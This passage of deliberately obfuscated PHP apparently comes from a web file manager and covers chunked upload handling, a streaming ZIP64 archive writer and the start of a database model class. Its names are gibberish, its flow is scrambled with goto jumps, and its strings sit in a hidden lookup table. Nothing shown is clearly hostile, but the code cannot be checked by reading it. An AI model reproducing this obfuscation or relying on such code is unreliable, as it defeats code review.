$bš×¡é›Ùñ, !0); } goto bîÌª§ğ•…; AÒ¿ÔàäÙ: $eÓâÊˆÇ•Ğ = $this->writeTo($cŒ³ÌØËŒ, $f‘Şˆ¶«°Ú, $this->tempFile); $a¡“±õº¦÷ = IO::hashSimple($cŒ³ÌØËŒ); $C´¹èÛ™¢© = IO::size($cŒ³ÌØËŒ); goto bÀ¹÷ ‚´Ì; fš»‹¥êŞ®: CacheLock::unlock($this->tempFile); return $this->tempFile; goto f„†–‡ŠœÏ; d¹Ã·öâÁÏ: $cŒ³ÌØËŒ = $this->moveUploadedFile($E”„²•ï—›); if ($C´¹èÛ™¢© > 0 && filesize($cŒ³ÌØËŒ) == 0) { $this->showJson($eÈçÊ¼à®[2008], !1); } if (!$cŒ³ÌØËŒ) { $this->showJson(LNG($eÈçÊ¼à®[2009]), !1); } goto C›÷óèëË; f„†–‡ŠœÏ: } private function checkSize() { $D¼À¹èË—™ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (phpBuild64() || $this->in[$D¼À¹èË—™[77]] < PHP_INT_MAX) { return; } show_json(LNG($D¼À¹èË—™[2018]), !1); } private function showJson($C¶×™¾Ãğé, $d¿½õŠîò) { CacheLock::unlock($this->tempFile); if (!$d¿½õŠîò) { return show_json($C¶×™¾Ãğé, $d¿½õŠîò); } show_json($C¶×™¾Ãğé, $d¿½õŠîò); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto BÕ§Œã•Ã; BÕ§Œã•Ã: $dÓòêˆäÜÕ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dƒ¡ÕëØ = TEMP_FILES; @mk_dir($Dƒ¡ÕëØ); goto c¶‹‚š—Ã; c¶‹‚š—Ã: touch($Dƒ¡ÕëØ . $dÓòêˆäÜÕ[2019]); $d¡¤Éœ» Ò = isset($this->in[$dÓòêˆäÜÕ[2020]]) ? $this->in[$dÓòêˆäÜÕ[2020]] : !1; if (strlen($d¡¤Éœ» Ò) < 30) { $d¡¤Éœ» Ò = md5(USER_ID . $this->in[$dÓòêˆäÜÕ[75]] . $this->fileName . $this->in[$dÓòêˆäÜÕ[77]]); } goto eé˜¼î”‚™; eé˜¼î”‚™: $this->tempFile = $Dƒ¡ÕëØ . $dÓòêˆäÜÕ[2021] . md5($d¡¤Éœ» Ò . $this->in[$dÓòêˆäÜÕ[1565]]); goto B‹ˆÕÇ¶ù; B‹ˆÕÇ¶ù: } private function moveUploadedFile($DŸ²º¶óå×) { $aáø²´„†ò =& $_SERVER[åÌÛ»ô¢‚ö™]; $a§·£–Ò‰¶ = $this->uploadFile; if ($a§·£–Ò‰¶ == $aáø²´„†ò[2022]) { @file_put_contents($DŸ²º¶óå×, base64_decode($_REQUEST[$aáø²´„†ò[2023]])); } else { if ($a§·£–Ò‰¶ == $aáø²´„†ò[1845]) { $a†ï¿·­ì« = @fopen($DŸ²º¶óå×, $aáø²´„†ò[1555]); $this->writeTo($a§·£–Ò‰¶, $a†ï¿·­ì«, $DŸ²º¶óå×); } else { if (!move_uploaded_file($a§·£–Ò‰¶, $DŸ²º¶óå×)) { return !1; } } } return $DŸ²º¶óå×; } private function writeTo($B…“à¬™Øâ, $A•¥¦ùèë, $CŒ†ÅÜõÓ) { goto cæ§è¦†’ï; E¼Ä¥Û°²ƒ: return !0; goto D ÙµçäŒ¤; fš´šÇ£: $cÙ½·×ÕÑÙ = @fopen($B…“à¬™Øâ, $b½Ğ·’£¬Ì[1554]); if (!$cÙ½·×ÕÑÙ || !$A•¥¦ùèë || !$D‹’§æŠ) { CacheLock::unlock($dø©Şù”); return !1; } while (!feof($cÙ½·×ÕÑÙ)) { fwrite($A•¥¦ùèë, fread($cÙ½·×ÕÑÙ, 1024 * 200)); } goto dİ¾™ŸÙ´å; cæ§è¦†’ï: $b½Ğ·’£¬Ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $dø©Şù” = $b½Ğ·’£¬Ì[2024] . $CŒ†ÅÜõÓ; $D‹’§æŠ = CacheLock::lock($dø©Şù”, 1); goto fš´šÇ£; dİ¾™ŸÙ´å: fclose($cÙ½·×ÕÑÙ); fclose($A•¥¦ùèë); CacheLock::unlock($dø©Şù”); goto E¼Ä¥Û°²ƒ; D ÙµçäŒ¤: } private function statusGet() { goto F“ò ÜÍÄò; då¶«ïÖ›Ä: if (!$this->statusData) { $eÜŠ’Ëğóí = array($A¼æÁˆîÈò[28] => $this->fileName, $A¼æÁˆîÈò[2012] => 0, $A¼æÁˆîÈò[2013] => array()); $this->statusSet($eÜŠ’Ëğóí); } return $this->statusData; goto EŒ¢¦Å§„ë; DÒÛßóÒˆ‚: $d…ãÉ „»» = !1; if (file_exists($a…‚ˆÎ¿ø‰)) { $d…ãÉ „»» = @file_get_contents($a…‚ˆÎ¿ø‰); } if ($d…ãÉ „»») { $this->statusData = json_decode($d…ãÉ „»», !0); } goto då¶«ïÖ›Ä; F“ò ÜÍÄò: $A¼æÁˆîÈò =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($this->statusData)) { return $this->statusData; } $a…‚ˆÎ¿ø‰ = $this->tempFile . $A¼æÁˆîÈò[2025]; goto DÒÛßóÒˆ‚; EŒ¢¦Å§„ë: } public function statusSet($b„ç‚±¼æƒ) { $f•¯Ô„İÚ = $this->tempFile . $_SERVER[åÌÛ»ô¢‚ö™][2025]; if (!$b„ç‚±¼æƒ) { if (file_exists($f•¯Ô„İÚ)) { @unlink($f•¯Ô„İÚ); } return !0; } $this->statusData = $b„ç‚±¼æƒ; return file_put_contents($f•¯Ô„İÚ, json_encode($b„ç‚±¼æƒ)); } private function initFileTemp() { $FèØ§ç˜µÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (file_exists($this->tempFile)) { return; } $A¸óªëÁƒ· = fopen($this->tempFile, $FèØ§ç˜µÒ[2026]); fseek_64($A¸óªëÁƒ·, $this->in[$FèØ§ç˜µÒ[77]] - 1, SEEK_SET); fwrite($A¸óªëÁƒ·, $FèØ§ç˜µÒ[494]); fclose($A¸óªëÁƒ·); } public function checkChunk() { goto f®“ ë¼; cİâÌ„‰‰¯: return $E§‰‚¤êÊ; goto bÌçİ¨Ç‚‰; aãÈºˆ‹‚‘: $cîõÓ‰‘‡Ì = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($cîõÓ‰‘‡Ì[$F¦ññ·îÜ[2013]] as $aÂÆÅÍÊ¨ö) { $cÉõˆ‡ÈÉ´ = $aÂÆÅÍÊ¨ö[$F¦ññ·îÜ[168]]; if ($cÉõˆ‡ÈÉ´) { $E§‰‚¤êÊ[$F¦ññ·îÜ[2027] . $aÂÆÅÍÊ¨ö[$F¦ññ·îÜ[1063]]] = $cÉõˆ‡ÈÉ´; } } goto cİâÌ„‰‰¯; f®“ ë¼: $F¦ññ·îÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E§‰‚¤êÊ = array(); CacheLock::lock($this->tempFile); goto aãÈºˆ‹‚‘; bÌçİ¨Ç‚‰: } private function checkChunkHash($B‹’…µ¯±Œ) { goto Eàã‡ÑóÓ«; EÖª¢îó¸È: $f¿äé›ÅÔÏ = !0; foreach ($B‹’…µ¯±Œ[$Bƒƒã¤ùÄâ[2013]] as $EÇ¼Ä‘àá) { fseek_64($dÊå‚å‘¢, $EÇ¼Ä‘àá[$Bƒƒã¤ùÄâ[2015]]); $E³‘·‚¡Á¤ = PathDriverStream::hash($dÊå‚å‘¢, $EÇ¼Ä‘àá[$Bƒƒã¤ùÄâ[77]]); if ($EÇ¼Ä‘àá[$Bƒƒã¤ùÄâ[168]] != $E³‘·‚¡Á¤) { $f¿äé›ÅÔÏ = !1; break; } } fclose($dÊå‚å‘¢); goto F––åî¡; Eàã‡ÑóÓ«: $Bƒƒã¤ùÄâ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (count($B‹’…µ¯±Œ[$Bƒƒã¤ùÄâ[2013]]) != $B‹’…µ¯±Œ[$Bƒƒã¤ùÄâ[2012]]) { return !1; } $aÏ¥†ƒÒ„Ö = _get($this->in, $Bƒƒã¤ùÄâ[2020]); goto eƒàá÷Â¡¯; eƒàá÷Â¡¯: $e´ˆ»”Çö‚ = _get($this->in, $Bƒƒã¤ùÄâ[2028]); if (strlen($e´ˆ»”Çö‚) == 32 && IO::hashSimple($this->tempFile) == $aÏ¥†ƒÒ„Ö && IO::hashMd5($this->tempFile) == $e´ˆ»”Çö‚) { return !0; } $dÊå‚å‘¢ = fopen($this->tempFile, $Bƒƒã¤ùÄâ[1195]); goto EÖª¢îó¸È; F––åî¡: return $f¿äé›ÅÔÏ; goto FßÑŞšÏ¾Ü; FßÑŞšÏ¾Ü: } public static function fileName() { goto Fí­àŠôö•; Fí­àŠôö•: $d†ÍÂßˆë =& $_SERVER[åÌÛ»ô¢‚ö™]; global $in; $CŠëà‹µÖµ = isset($in[$d†ÍÂßˆë[28]]) ? $in[$d†ÍÂßˆë[28]] : $d†ÍÂßˆë[33]; goto Dº–•¢’›¿; f®‹ñÊÎäÑ: $B†…ÆÏ¾Âë = $B†…ÆÏ¾Âë ? $B†…ÆÏ¾Âë : time(); $c’ò¶Ñ·ÉŞ = strtolower($CŠëà‹µÖµ); if ($c’ò¶Ñ·ÉŞ == $d†ÍÂßˆë[2030] || $c’ò¶Ñ·ÉŞ == $d†ÍÂßˆë[2031]) { $CŠëà‹µÖµ = date($d†ÍÂßˆë[717], $B†…ÆÏ¾Âë) . $d†ÍÂßˆë[70] . $in[$d†ÍÂßˆë[77]] . $d†ÍÂßˆë[1659]; } else { if ($c’ò¶Ñ·ÉŞ == $d†ÍÂßˆë[2032]) { $CŠëà‹µÖµ = date($d†ÍÂßˆë[717], $B†…ÆÏ¾Âë) . $d†ÍÂßˆë[70] . $in[$d†ÍÂßˆë[77]] . $d†ÍÂßˆë[2033]; } } goto b†šø¢ã; Dº–•¢’›¿: if (!empty($_FILES)) { $CŠëà‹µÖµ = $CŠëà‹µÖµ ? $CŠëà‹µÖµ : $_FILES[$d†ÍÂßˆë[171]][$d†ÍÂßˆë[411]]; } if (!is_wap()) { return KodIO::clear($CŠëà‹µÖµ); } $B†…ÆÏ¾Âë = strtotime($in[$d†ÍÂßˆë[2029]]); goto f®‹ñÊÎäÑ; b†šø¢ã: return KodIO::clear($CŠëà‹µÖµ); goto FŒ„©·„–”; FŒ„©·„–”: } private function errorInfo($dŸÙŠ®ó°´) { $côš¦ˆÅ¹¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D™È³¾àŠï = array($côš¦ˆÅ¹¶[2034], $côš¦ˆÅ¹¶[2035], $côš¦ˆÅ¹¶[2036], $côš¦ˆÅ¹¶[2037], $côš¦ˆÅ¹¶[2038], $côš¦ˆÅ¹¶[2039], $côš¦ˆÅ¹¶[2040], $côš¦ˆÅ¹¶[2041]); return $dŸÙŠ®ó°´ . $côš¦ˆÅ¹¶[4] . $D™È³¾àŠï[$dŸÙŠ®ó°´]; } } class ZipMake { const VERSION = "\60\56\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($c£¿ŠàŠœ† = null) { $bº¶’ó¯ƒ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->outputStream = fopen($bº¶’ó¯ƒ§[2042], $bº¶’ó¯ƒ§[1252]); $this->outputName = $c£¿ŠàŠœ†; $this->needHeaders = !0; } public function addFile($c˜Ç‚›À¾«, $BØ•ä™‰Æ) { goto FÀ²Â§—¥œ; cò”àç¦ã‚: while (!feof($fŠ›İ´â¬È)) { $FŸÛÈ…Ù® = fread($fŠ›İ´â¬È, 1048576); $this->send($FŸÛÈ…Ù®); } fclose($fŠ›İ´â¬È); $dÀƒä»ĞÖ = hexdec(hash_file($FãÅ¹Íºö‘[2044], $BØ•ä™‰Æ)); goto aïÛğ›¹±Ô; A½óÎÍÁ†ß: $CĞ‰ƒïŠà = $this->addFileHeader($c˜Ç‚›À¾«, $a‡¹ø›‚º‹); $cšàÉ¦Ú™™ = $eºµ´–ªÃŸ = filesize_64($BØ•ä™‰Æ); $fŠ›İ´â¬È = fopen($BØ•ä™‰Æ, $FãÅ¹Íºö‘[2043]); goto cò”àç¦ã‚; FÀ²Â§—¥œ: $FãÅ¹Íºö‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c˜Ç‚›À¾« = $this->filterFilename($c˜Ç‚›À¾«); $a‡¹ø›‚º‹ = static::METHOD_STORE; goto A½óÎÍÁ†ß; aïÛğ›¹±Ô: $this->addFileFooter($c˜Ç‚›À¾«, $a‡¹ø›‚º‹, $dÀƒä»ĞÖ, $cšàÉ¦Ú™™, $eºµ´–ªÃŸ, $CĞ‰ƒïŠà); goto EŒ”êÚšéš; EŒ”êÚšéš: } public function addFileFromStream($EÙ­Ô„Š”Ë, $D„½ƒî”«¹) { goto DÂ–í…Á¼»; Aà¨£º•œ: fseek($D„½ƒî”«¹, 0, SEEK_END); $bñù´Š¦¹ì = $A§¼Ç¦ß = ftell($D„½ƒî”«¹); rewind($D„½ƒî”«¹); goto DÇôß”‚¶ˆ; DÂ–í…Á¼»: $EÙ­Ô„Š”Ë = $this->filterFilename($EÙ­Ô„Š”Ë); $d·¬”¯˜è = static::METHOD_STORE; $e¾æ§¹á»¥ = $this->addFileHeader($EÙ­Ô„Š”Ë, $d·¬”¯˜è); goto Aà¨£º•œ; c”†²Öƒ×: $this->addFileFooter($EÙ­Ô„Š”Ë, $d·¬”¯˜è, $b×ˆÛ¼¨‚õ, $bñù´Š¦¹ì, $A§¼Ç¦ß, $e¾æ§¹á»¥); goto b÷ÉåÌ; DÇôß”‚¶ˆ: $c´„½¨ºË = hash_init($_SERVER[åÌÛ»ô¢‚ö™][2044]); while (!feof($D„½ƒî”«¹)) { $còÌ¨é™È = fread($D„½ƒî”«¹, 1048576); hash_update($c´„½¨ºË, $còÌ¨é™È); $this->send($còÌ¨é™È); } $b×ˆÛ¼¨‚õ = hexdec(hash_final($c´„½¨ºË)); goto c”†²Öƒ×; b÷ÉåÌ: } public function finish() { foreach ($this->files as $EÂ•ÁŠÖò) { $this->addCdrFile($EÂ•ÁŠÖò); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($aõÛÇé§¹ª, $dÍÉ‰¾µ¤) { goto c¸ØÑ¼­… ; b®èÈË„—©: $F´ñµê‚• = $this->packFields($c³­œŞ¯ñ); $c¾Ü‹Ïåˆ® = $this->packFields($bÂ¥†Ñ÷òí); $this->send($F´ñµê‚• . $aõÛÇé§¹ª . $c¾Ü‹Ïåˆ®); goto Dï„ïáİŠ‰; Fª Ú¹•×: $b²ÇØÒ¥öÒ = $this->dosTime(time()); $c³­œŞ¯ñ = array(array($Aœ×Ú˜¹½æ[2046], static::FILE_HEADER_SIGNATURE), array($Aœ×Ú˜¹½æ[2047], static::ZIP_VERSION_64), array($Aœ×Ú˜¹½æ[2047], 8), array($Aœ×Ú˜¹½æ[2047], $dÍÉ‰¾µ¤), array($Aœ×Ú˜¹½æ[2046], $b²ÇØÒ¥öÒ), array($Aœ×Ú˜¹½æ[2046], 0), array($Aœ×Ú˜¹½æ[2046], 4294967295), array($Aœ×Ú˜¹½æ[2046], 4294967295), array($Aœ×Ú˜¹½æ[2047], $aµÛâö¤·÷), array($Aœ×Ú˜¹½æ[2047], 32)); $bÂ¥†Ñ÷òí = array(array($Aœ×Ú˜¹½æ[2047], 1), array($Aœ×Ú˜¹½æ[2047], 28), array($Aœ×Ú˜¹½æ[2048], 0), array($Aœ×Ú˜¹½æ[2048], 0), array($Aœ×Ú˜¹½æ[2048], 0), array($Aœ×Ú˜¹½æ[2046], 0)); goto b®èÈË„—©; Dï„ïáİŠ‰: return strlen($F´ñµê‚•) + $aµÛâö¤·÷ + strlen($c¾Ü‹Ïåˆ®); goto E†¨´£ ¢; c¸ØÑ¼­… : $Aœ×Ú˜¹½æ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aõÛÇé§¹ª = preg_replace($Aœ×Ú˜¹½æ[2045], $Aœ×Ú˜¹½æ[33], $aõÛÇé§¹ª); $aµÛâö¤·÷ = strlen($aõÛÇé§¹ª); goto Fª Ú¹•×; E†¨´£ ¢: } protected function addFileFooter($EØƒò ‰¼¨, $Cæ²›áŞÛÈ, $b‹Ó§Æó, $aîì«®ª”‡, $fğÁ½‘Ö‹÷, $A¼¯ğÖ¤) { $A®…÷óÉÛ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d²çÔ´…Ğ = array(array($A®…÷óÉÛ[2046], static::DATA_DESCRIPTOR_SIGNATURE), array($A®…÷óÉÛ[2046], $b‹Ó§Æó), array($A®…÷óÉÛ[2048], $aîì«®ª”‡), array($A®…÷óÉÛ[2048], $fğÁ½‘Ö‹÷)); $D‘ÕñªÌäë = $this->packFields($d²çÔ´…Ğ); $this->send($D‘ÕñªÌäë); $cŒ’µ‹•éè = $A¼¯ğÖ¤ + $aîì«®ª”‡ + $EÎÒì•¢˜¸; $this->addToCdr($EØƒò ‰¼¨, $Cæ²›áŞÛÈ, $b‹Ó§Æó, $aîì«®ª”‡, $fğÁ½‘Ö‹÷, $cŒ’µ‹•éè); } private function addToCdr($cÊš®ïÇÇî, $fŠ¥×³¯˜„, $aß¦À‹¬¤, $FøÙæŒ§ì, $D¶»ÙöˆàÃ, $e´œÒ«æµ) { $this->files[] = array($cÊš®ïÇÇî, $fŠ¥×³¯˜„, $aß¦À‹¬¤, $FøÙæŒ§ì, $D¶»ÙöˆàÃ, $this->ofs); $this->ofs += $e´œÒ«æµ; } protected function addCdrFile($eòØˆ¸®¤À) { goto Eù•ŸÜïò; FåÇŞˆöè: $dŸáÏ¬Íµ— = $this->dosTime(time()); $E´ñŠ”Ôİ = array(array($C¶™“¢¥ÀÛ[2046], static::CDR_FILE_SIGNATURE), array($C¶™“¢¥ÀÛ[2047], static::ZIP_VERSION_64), array($C¶™“¢¥ÀÛ[2047], static::ZIP_VERSION_64), array($C¶™“¢¥ÀÛ[2047], 8), array($C¶™“¢¥ÀÛ[2047], $fÊâ†Ú¸„ğ), array($C¶™“¢¥ÀÛ[2046], $dŸáÏ¬Íµ—), array($C¶™“¢¥ÀÛ[2046], $F‚¾ÌŞ«), array($C¶™“¢¥ÀÛ[2046], 4294967295), array($C¶™“¢¥ÀÛ[2046], 4294967295), array($C¶™“¢¥ÀÛ[2047], strlen($fÍìÎ¡ªóÈ)), array($C¶™“¢¥ÀÛ[2047], 32), array($C¶™“¢¥ÀÛ[2047], strlen($e·ÂŒâÍÓ)), array($C¶™“¢¥ÀÛ[2047], 0), array($C¶™“¢¥ÀÛ[2047], 0), array($C¶™“¢¥ÀÛ[2046], 32), array($C¶™“¢¥ÀÛ[2046], 4294967295)); $DÇ‡êá„¦î = array(array($C¶™“¢¥ÀÛ[2047], 1), array($C¶™“¢¥ÀÛ[2047], 28), array($C¶™“¢¥ÀÛ[2048], $fÃ££¹É©), array($C¶™“¢¥ÀÛ[2048], $EƒÏÓÇ«„), array($C¶™“¢¥ÀÛ[2048], $A–îò¸÷—¹), array($C¶™“¢¥ÀÛ[2046], 0)); goto a’‹ÄƒÄ©; Eù•ŸÜïò: $C¶™“¢¥ÀÛ =& $_SERVER[åÌÛ»ô¢‚ö™]; list($fÍìÎ¡ªóÈ, $fÊâ†Ú¸„ğ, $F‚¾ÌŞ«, $EƒÏÓÇ«„, $fÃ££¹É©, $A–îò¸÷—¹) = $eòØˆ¸®¤À; $e·ÂŒâÍÓ = $C¶™“¢¥ÀÛ[33]; goto FåÇŞˆöè; a’‹ÄƒÄ©: $C… ÖòÊ† = $this->packFields($E´ñŠ”Ôİ); $e’ƒ·¡Ìé± = $this->packFields($DÇ‡êá„¦î); $aÜ’ÚŸ¥¿Â = $C… ÖòÊ† . $fÍìÎ¡ªóÈ . $e·ÂŒâÍÓ . $e’ƒ·¡Ìé±; goto D•¨¯æÊƒ×; D•¨¯æÊƒ×: $this->send($aÜ’ÚŸ¥¿Â); $this->cdr_ofs += strlen($aÜ’ÚŸ¥¿Â); goto fÎõæÌ§¨; fÎõæÌ§¨: } protected function addCdr64Eof() { goto e©ÎšòÊÒ‹; e©ÎšòÊÒ‹: $b¸Æõ«Åî =& $_SERVER[åÌÛ»ô¢‚ö™]; $A£ÆíŸÀÑ‘ = count($this->files); $a ‘Şšá– = $this->cdr_ofs; goto cÁ¤•Õ¬âğ; f‹×Àé×È: $this->send($C´öÚî¼§Ş); goto CÖ„ÇçØğÚ; cÁ¤•Õ¬âğ: $eÕóé‰Úõâ = $this->ofs; $Eßê‡çÚà» = array(array($b¸Æõ«Åî[2046], static::ZIP64_CDR_EOF_SIGNATURE), array($b¸Æõ«Åî[2048], 44), array($b¸Æõ«Åî[2047], static::ZIP_VERSION_64), array($b¸Æõ«Åî[2047], static::ZIP_VERSION_64), array($b¸Æõ«Åî[2046], 0), array($b¸Æõ«Åî[2046], 0), array($b¸Æõ«Åî[2048], $A£ÆíŸÀÑ‘), array($b¸Æõ«Åî[2048], $A£ÆíŸÀÑ‘), array($b¸Æõ«Åî[2048], $a ‘Şšá–), array($b¸Æõ«Åî[2048], $eÕóé‰Úõâ)); $C´öÚî¼§Ş = $this->packFields($Eßê‡çÚà»); goto f‹×Àé×È; CÖ„ÇçØğÚ: } protected function addCdr64Locator() { goto F…ÉÈ‰ÆºÂ; F…ÉÈ‰ÆºÂ: $A‚½‡–ÂÕô =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÂâ”çå— = count($this->files); $d³ÓÕÛØ·¡ = $this->cdr_ofs; goto DŞÅ„Œò¸÷; e÷Æ½”Ê£: $this->send($AØçÂ—´õí); goto c¤„í‡ğÃ; DŞÅ„Œò¸÷: $A’êËâĞ†ˆ = $this->ofs; $e«øºéÈßê = array(array($A‚½‡–ÂÕô[2046], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($A‚½‡–ÂÕô[2046], 0), array($A‚½‡–ÂÕô[2048], $A’êËâĞ†ˆ + $d³ÓÕÛØ·¡), array($A‚½‡–ÂÕô[2046], 1)); $AØçÂ—´õí = $this->packFields($e«øºéÈßê); goto e÷Æ½”Ê£; c¤„í‡ğÃ: } protected function addCdrEof() { goto CÜÑÕ¦…î‡; Bçº¬¹ÄÕ: $e‡‡°Ç¤‰¦ = $this->ofs; $bïá¬¹¹˜º = $dÊ‰¤—Ğª’[33]; $fŞÈ´Ü‰Æ÷ = array(array($dÊ‰¤—Ğª’[2046], static::CDR_EOF_SIGNATURE), array($dÊ‰¤—Ğª’[2047], 0), array($dÊ‰¤—Ğª’[2047], 0), array($dÊ‰¤—Ğª’[2047], $E¸àÉğì¹õ), array($dÊ‰¤—Ğª’[2047], $E¸àÉğì¹õ), array($dÊ‰¤—Ğª’[2046], 4294967295), array($dÊ‰¤—Ğª’[2046], 4294967295), array($dÊ‰¤—Ğª’[2047], strlen($bïá¬¹¹˜º))); goto BÍÑçÍ›Ø; CÜÑÕ¦…î‡: $dÊ‰¤—Ğª’ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E¸àÉğì¹õ = count($this->files); $b”Ê›¼‚„è = $this->cdr_ofs; goto Bçº¬¹ÄÕ; BÍÑçÍ›Ø: $f†×³©×œ¾ = $this->packFields($fŞÈ´Ü‰Æ÷) . $bïá¬¹¹˜º; $this->send($f†×³©×œ¾); goto c‰¢’¬µĞ; c‰¢’¬µĞ: } protected function addCdr() { foreach ($this->files as $eÅ…¦¹ßæÄ) { $this->addCdrFile($eÅ…¦¹ßæÄ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FÉÉ¡¸‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÔ¼ÈŒ¡ = $FÉÉ¡¸‡[220]; if ($this->outputName) { $eƒ‚Éˆ¦§è = trim(str_replace(array($FÉÉ¡¸‡[113], $FÉÉ¡¸‡[55], $FÉÉ¡¸‡[93], $FÉÉ¡¸‡[67], $FÉÉ¡¸‡[183], $FÉÉ¡¸‡[1015]), $FÉÉ¡¸‡[33], $this->outputName)); $B‚•–ÙÄ· = rawurlencode($eƒ‚Éˆ¦§è); $cÔ¼ÈŒ¡ .= "\73\40\x66\x69\154\x65\x6e\x61\155\145\x2a\x3d\165\x74\146\55\70\x27\47{$B‚•–ÙÄ·}"; } $dœù Ñ£í = array($FÉÉ¡¸‡[217] => $FÉÉ¡¸‡[2049], $FÉÉ¡¸‡[2050] => $cÔ¼ÈŒ¡, $FÉÉ¡¸‡[2051] => $FÉÉ¡¸‡[2052], $FÉÉ¡¸‡[2053] => $FÉÉ¡¸‡[2054], $FÉÉ¡¸‡[2055] => $FÉÉ¡¸‡[2056]); foreach ($dœù Ñ£í as $b„çß·‘‘¡ => $aŞ½Èß—¶á) { header($b„çß·‘‘¡ . $FÉÉ¡¸‡[902] . $aŞ½Èß—¶á); } } protected function send($d…äë¾ö¡­) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $d…äë¾ö¡­); } protected final function dosTime($f›±ïÍÂ»”) { $d¦¹°›…ô´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EĞŒ’¸õä = getdate($f›±ïÍÂ»”); if ($EĞŒ’¸õä[$d¦¹°›…ô´[1756]] < 1980) { $EĞŒ’¸õä = array($d¦¹°›…ô´[1756] => 1980, $d¦¹°›…ô´[2057] => 1, $d¦¹°›…ô´[2058] => 1, $d¦¹°›…ô´[2059] => 0, $d¦¹°›…ô´[2060] => 0, $d¦¹°›…ô´[2061] => 0); } $EĞŒ’¸õä[$d¦¹°›…ô´[1756]] -= 1980; return $EĞŒ’¸õä[$d¦¹°›…ô´[1756]] << 25 | $EĞŒ’¸õä[$d¦¹°›…ô´[2057]] << 21 | $EĞŒ’¸õä[$d¦¹°›…ô´[2058]] << 16 | $EĞŒ’¸õä[$d¦¹°›…ô´[2059]] << 11 | $EĞŒ’¸õä[$d¦¹°›…ô´[2060]] << 5 | $EĞŒ’¸õä[$d¦¹°›…ô´[2061]] >> 1; } protected function packFields($b°ó¶œ¼¤) { $Aœ…ŸÓ”ÙÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cã¿–¾’Ì© = $Aœ…ŸÓ”ÙÀ[33]; $A†£‘¸ÚÏŠ = array(); foreach ($b°ó¶œ¼¤ as $AÓßÁİİ¡Ô) { $Cã¿–¾’Ì© .= $AÓßÁİİ¡Ô[0]; $A†£‘¸ÚÏŠ[] = $AÓßÁİİ¡Ô[1]; } array_unshift($A†£‘¸ÚÏŠ, $Cã¿–¾’Ì©); return call_user_func_array($Aœ…ŸÓ”ÙÀ[2062], $A†£‘¸ÚÏŠ); } protected function filterFilename($dÖ½¡à¬ğ) { $d„™‘ºŞ¼¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; return str_replace(array($d„™‘ºŞ¼¤[93], $d„™‘ºŞ¼¤[4], $d„™‘ºŞ¼¤[190], $d„™‘ºŞ¼¤[69], $d„™‘ºŞ¼¤[113], $d„™‘ºŞ¼¤[946], $d„™‘ºŞ¼¤[949], $d„™‘ºŞ¼¤[286]), $d„™‘ºŞ¼¤[70], $dÖ½¡à¬ğ); } } goto A´à÷ÕŞƒÏ; CìÏŞÆ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\151\x6d\x65", "\164\x69\155\x65", "\x69\156\163\x65\x72\x74\x2c\x75\160\144\141\164\x65", "\146\165\156\143\x74\151\x6f\156"), array("\143\x72\145\141\164\x65\x54\151\x6d\145", "\x74\151\155\x65", "\151\156\163\x65\162\164", "\x66\165\x6e\x63\x74\x69\x6f\156")); public function setDataAuto($BÃ“·æã‘«) { $this->dataAuto = $BÃ“·æã‘«; } public function __construct($a¾ç›á¬‹ = '', $FğÉÔå‚ŒÎ = '', $dÅ³ÓáÂòè = '') { parent::__construct($a¾ç›á¬‹, $FğÉÔå‚ŒÎ, $dÅ³ÓáÂòè); } public static function textEncode($eˆ‘ô—”Îî) { if (!$eˆ‘ô—”Îî) { return $eˆ‘ô—”Îî; } $A†ïñÔ = json_encode($eˆ‘ô—”Îî); $A†ïñÔ = preg_replace_callback($_SERVER[åÌÛ»ô¢‚ö™][358], function ($aè’“›•ñ) { return addslashes($aè’“›•ñ[0]); }, $A†ïñÔ); return json_decode($A†ïñÔ); } public static function textDecode($AÒ£ˆØ×ªæ) { $B“™µá‰ŒÇ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F¦ ëÈ¤Ìµ = json_encode($AÒ£ˆØ×ªæ); $F¦ ëÈ¤Ìµ = preg_replace_callback($B“™µá‰ŒÇ[359], function ($b”¨Å”½¸‚) { return $_SERVER[åÌÛ»ô¢‚ö™][93]; }, $F¦ ëÈ¤Ìµ); return json_decode($F¦ ëÈ¤Ìµ); } protected $tableMeta = array(); protected function _beforeInsert(&$B¹„ˆÒÖÚ, $bÎí•­Îä) { $EŒ’²èµŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->checkDataAutoHas($EŒ’²èµŒ[360])) { return; } $this->dataBeforeFilter($B¹„ˆÒÖÚ, $EŒ’²èµŒ[360]); } protected function 